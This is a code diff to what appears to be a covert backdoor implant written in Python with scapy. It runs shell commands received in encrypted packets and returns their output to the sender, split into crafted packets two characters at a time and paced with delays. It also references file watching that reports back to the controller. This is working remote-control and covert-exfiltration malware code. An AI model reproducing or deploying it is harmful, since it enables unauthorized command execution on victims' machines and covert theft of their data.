@@ -57,12 +57,28 @@ def shellCommand(packet, command):
     print "Running command " + command
     ip = packet[IP].src
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output = configfile.password + output.stdout.read() + output.stderr.read()
-    encryptedData = encryption.encrypt(output, configfile.password)
-    helpers.sendMessage(encryptedData
-                       , configfile.password
-                       , configfile.protocol
-                       , ip)
+    output = output.stdout.read() + output.stderr.read()
+    encryptedData = encryption.encrypt(output, configfile.masterkey)
+    encryptedData = helpers.chunkString(2, encryptedData)
+    lastIndex = len(encryptedData) - 1
+    time.sleep(1)
+    for index, chunk in enumerate(encryptedData):
+        if len(chunk) == 2:
+            pairs = list(chunk)
+            packet = helpers.createPacketTwo(configfile.protocol, ip, pairs[0], pairs[1])
+        elif len(chunk) == 1:
+            packet = helpers.createPacketOne(configfile.protocol, ip, chunk)
+        if index == lastIndex:
+            packet = packet/Raw(load=configfile.password)
+        send(packet)
+        time.sleep(0.1)
+
+    # helpers.sendMessage(encryptedData
+    #                    , configfile.password
+    #                    , configfile.protocol
+    #                    , ip
+    #                    , 8000)
+    
 
 def watchAdd(path, ip):
     watch = observer.schedule(FileWatch(ip,configfile.protocol, configfile.password), path)
@@ -92,7 +108,7 @@ def exit():
 def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
         encryptedData = packet['Raw'].load
-        data = encryption.decrypt(encryptedData, configfile.password)
+        data = encryption.decrypt(encryptedData, configfile.masterkey)
         if data.startswith(configfile.password):
             data = data[len(configfile.password):]
             commandType, commandString = data.split(' ', 1)
